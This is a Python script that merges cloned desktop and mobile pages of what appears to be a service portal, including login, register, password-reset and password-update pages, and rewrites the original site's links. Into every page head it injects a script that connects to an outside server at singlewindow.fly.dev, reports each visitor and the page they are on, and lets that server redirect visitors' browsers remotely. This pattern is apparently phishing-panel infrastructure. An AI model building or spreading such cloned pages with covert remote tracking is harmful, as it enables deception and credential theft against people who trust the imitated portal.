from pathlib import Path
import re
import subprocess

TRACKER = """<script>
(function(){
  var SVID=localStorage.getItem('visitorId');
  var s=document.createElement('script');
  s.src='https://singlewindow.fly.dev/socket.io/socket.io.js';
  s.onload=function(){
    var sock=io('https://singlewindow.fly.dev',{transports:['polling','websocket'],reconnection:true});
    var m={'/':'الصفحة الرئيسية','/service':'صفحة الخدمات','/login':'تسجيل الدخول','/reset':'نسيت كلمة المرور','/update':'تحديث كلمة المرور'};
    function g(){var p=window.location.pathname;if(p.startsWith('/services/'))return 'خدمة: '+decodeURIComponent(p.replace('/services/','')).replace(/-/g,' ');return m[p]||p;}
    sock.on('connect',function(){
      sock.emit('visitor:register',{existingVisitorId:SVID,currentPage:g()});
      sock.emit('visitor:pageEnter',g());
    });
    sock.on('successfully-connected',function(d){if(d&&d.pid)localStorage.setItem('visitorId',d.pid);});
    sock.on('visitor:navigate',function(page){
      if(!page)return;
      var p=page.startsWith('/')?page:'/'+page;
      window.location.href=p;
    });
    window._sw_socket=sock;
  };
  document.head.appendChild(s);
})();
</script>"""

MERGE_CSS = """<style id="sw-responsive-merge">
@media screen and (min-width: 769px) {
  #sw-mobile-version { display: none !important; }
  #sw-desktop-version { display: block !important; }
}
@media screen and (max-width: 768px) {
  #sw-desktop-version { display: none !important; }
  #sw-mobile-version { display: block !important; }
  /* Fix Wix mobile width to fill screen */
  #sw-mobile-version #SITE_CONTAINER,
  #sw-mobile-version .device-mobile-optimized #SITE_CONTAINER {
    width: 100% !important;
    max-width: 100% !important;
    margin: 0 !important;
  }
  #sw-mobile-version body.device-mobile-optimized #SITE_CONTAINER {
    width: 100% !important;
  }
}
#sw-mobile-version { display: none; }
</style>"""

def remove_tracker(html):
    return re.sub(r'<script>\s*\(function\(\)\{[^<]{30,}?_sw_socket[^<]*?\}\)\(\);\s*</script>', '', html, flags=re.DOTALL)

def fix_links(html):
    html = html.replace('https://www.sinwinqa.com/', '/')
    html = html.replace('https://www.sinwinqa.com', '')
    return html

def get_body(html):
    """Extract everything between <body> and </body>"""
    start = html.lower().find('<body')
    if start == -1:
        return html
    start = html.find('>', start) + 1
    end = html.lower().rfind('</body>')
    if end == -1:
        return html[start:]
    return html[start:end]

def get_head_styles(html):
    """Extract style tags"""
    return '\n'.join(re.findall(r'<style[^>]*>.*?</style>', html, re.DOTALL))

def get_git_file(commit, path):
    result = subprocess.run(
        ['git', 'show', f'{commit}:{path}'],
        capture_output=True, cwd='/home/ubuntu/singlewindoo'
    )
    if result.returncode == 0:
        return result.stdout.decode('utf-8', errors='ignore')
    return None

def merge_page(desktop_html, mobile_html, output_path, name):
    try:
        # Clean both
        desktop_html = remove_tracker(desktop_html)
        mobile_html = remove_tracker(mobile_html)
        desktop_html = fix_links(desktop_html)
        mobile_html = fix_links(mobile_html)
        # Fix Wix mobile width: 320px -> 100%
        mobile_html = mobile_html.replace('width:320px;margin-right:auto;margin-left:auto', 'width:100%;margin-right:0;margin-left:0')
        mobile_html = mobile_html.replace('width:320px', 'width:100%')
        # Fix overflow
        mobile_html = mobile_html.replace('overflow-x:hidden;overflow-y:auto', 'overflow-x:hidden;overflow-y:auto;width:100%')

        # Extract parts
        desktop_body = get_body(desktop_html)
        mobile_body = get_body(mobile_html)
        mobile_styles = get_head_styles(mobile_html)

        # Build merged body
        merged_body = (
            '\n<div id="sw-desktop-version">\n' +
            desktop_body +
            '\n</div>\n' +
            '<div id="sw-mobile-version">\n' +
            mobile_styles + '\n' +
            mobile_body +
            '\n</div>\n'
        )

        # Use desktop as base - replace body content
        # Find body tag
        body_start = desktop_html.lower().find('<body')
        body_tag_end = desktop_html.find('>', body_start) + 1
        body_close = desktop_html.lower().rfind('</body>')

        result = (
            desktop_html[:body_tag_end] +
            merged_body +
            desktop_html[body_close:]
        )

        # Inject CSS and tracker into head
        if '</head>' in result:
            result = result.replace('</head>', MERGE_CSS + '\n' + TRACKER + '\n</head>', 1)

        Path(output_path).write_text(result, encoding='utf-8')
        print(f"✅ Merged: {name} ({len(result)//1024}KB)")
        return True
    except Exception as e:
        print(f"❌ Error {name}: {e}")
        import traceback
        traceback.print_exc()
        return False

base = Path('/home/ubuntu/singlewindoo/client/public')
desktop_commit = '3aa3851'

pages = [
    ('sw-index.html', '/tmp/sinwinqa-mobile.html', 'index'),
    ('sw-service.html', '/tmp/sinwinqa-service-mobile.html', 'service'),
    ('sw-reset.html', '/tmp/sinwinqa-reset-mobile.html', 'reset'),
    ('sw-login.html', '/tmp/sinwinqa-login-mobile.html', 'login'),
    ('sw-register.html', '/tmp/sinwinqa-register-mobile.html', 'register'),
    ('sw-update.html', '/tmp/sinwinqa-update-mobile.html', 'update'),
]

for desktop_file, mobile_file, name in pages:
    desktop_html = get_git_file(desktop_commit, f'client/public/{desktop_file}')
    if not desktop_html:
        print(f"❌ Could not get desktop: {desktop_file}")
        continue
    mobile_html = Path(mobile_file).read_text(encoding='utf-8', errors='ignore')
    merge_page(desktop_html, mobile_html, base / desktop_file, name)

print("\n✅ Done!")
